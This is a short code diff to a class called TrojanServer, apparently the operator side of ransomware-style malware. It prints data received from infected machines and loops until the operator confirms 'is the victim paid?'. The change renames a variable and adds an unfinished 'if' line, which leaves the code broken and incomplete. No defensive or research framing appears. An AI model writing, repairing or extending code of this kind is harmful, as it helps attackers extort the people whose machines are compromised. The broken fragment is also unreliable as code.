@@ -127,9 +127,10 @@ class TrojanServer:
         decoded_data = data.decode()
         print(decoded_data)
         
-        has_payed = "no"
-        while(has_payed == "no"):
-            has_payed = input("is the victim paid? [yes/no]")
+        has_paid = "no"
+        while(has_paid == "no"):
+            has_paid = input("is the victim paid? [yes/no]")
+            if
 
 
 
